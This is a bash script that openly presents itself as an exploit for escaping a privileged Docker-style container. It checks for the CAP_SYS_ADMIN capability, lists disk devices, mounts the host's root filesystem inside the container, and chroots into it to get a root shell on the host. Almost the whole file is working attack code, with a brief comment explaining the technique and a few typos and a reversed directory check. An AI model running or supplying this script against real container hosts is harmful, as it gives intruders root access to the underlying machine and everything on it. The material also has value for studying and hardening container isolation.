#!/bin/bash

# This is the code for the Mount Host Filesystem exploit.
# Here I exploit the CAP_SYS_ADMIN capability of a privileged
# container. This capability allow to mount the device containing
# the entire host filesystem in a directory inside the container.
# Since we are root inside the container, and the CAP_CHROOT in
# available by default, we can change the root directory of the
# container's root and gain access to the host system with
# root privileges. 

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Installing the following packages"
echo -e "${GREEN}    + libcap2/libcap2-bin (for the capsh tool)"
echo -e "${GREEN}    + fidsk (for the fdisk utility)"
echo -e "${GREEN}    + build-essential (for missing default tools)"
echo -e "${GREEN}    + findmnt (to find all mounts points and apply filters)"
echo -e "${GREEN}    + jq (to handle JSON output)${NC}"

apt update && apt install -y libcap2 libcap2-bin fdisk build-essential jq

stty erase ^H

echo -e "[*] ${GREEN}Installing Finished${NC}"
echo -e "[*] ${GREEN}Check for the CAP_SYS_ADMIN capability available${NC}"
cap=$(capsh --print | grep -E '[^!]cap_sys_admin') # Check if CAP_SYS_ADMIN capability is activated
if [[ ! -z ${cap} ]]; then
	echo -e "[*] ${GREEN}CAP_SYS_ADMIN capability found${NC}"
else
	echo -e "[*] ${RED}CAP_SYS_ADMIN capability not found. Impossibility to continue.${NC}"
	echo -e "[*] ${RED}Exiting ...${NC}"
	exit 1
fi;

echo -e "[*] ${GREEN}Check if there is a device that mount the host filesystem${NC}"
fdisk -l  # Check if there is a device that mount the host filesystem

echo -e "[*] ${YELOW}Type the device: ${NC}"
read dev

echo -e "[*] ${GREEN}Check if the host filesystem " ${dev} " is already mounted${NC}"
ismounted=$(findmnt --source ${dev} --json | jq '.filesystems[] | select(.source == "'${dev}'") | .target')
test ! -z ${ismounted} && echo -e "[*] ${GREEN}"${dev}" is mounted on "${ismounted}"${NC}" || echo -e "[*] ${YELLOW}"${dev}" is not mounted${NC}"

dest="/tmp"
echo -e "[*] ${YELOW}Type a destination: (default /tmp) ${NC}"
read dest

if [[ -z ${ismounted} ]]; then
	echo -e "[*] ${GREEN}Check if " ${dest} " already exists${NC}"
	# Check if the directory exists or not
	if [[ -d ${dest} ]]; then
		echo -e "[*] ${GREEN}" ${dest}" created${NC}"
		mkdir -p ${dest}
	fi;

	echo -e "[*] ${GREEN}Mouting " ${dev} " to " ${dest} "${NC}"
	mount ${dev} ${dest}  # Mount the device on the destination
fi;

echo -e "[*] ${GREEN}Try chrooting in the mounted filsystem${NC}"
chroot ${dest} bash  # change the root directory and execute bash
